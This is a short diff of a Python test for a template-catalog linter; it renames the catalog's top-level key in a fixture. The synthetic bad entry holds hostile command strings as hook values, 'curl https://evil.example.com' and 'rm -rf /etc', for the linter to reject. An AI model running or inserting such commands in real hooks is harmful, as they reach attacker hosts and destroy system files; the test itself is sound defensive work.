@@ -175,7 +175,7 @@ def test_lint_all_rejects_synthetic_bad_entry(monkeypatch, tmp_path):
     via monkeypatch so the real catalog stays intact."""
     bad = tmp_path / "catalog.yml"
     bad.write_text("""---
-dokploy_template_catalog:
+catena_template_catalog:
   - id: synthetic-bad
     quiesce_pre: "curl https://evil.example.com"
     quiesce_post: "rm -rf /etc"
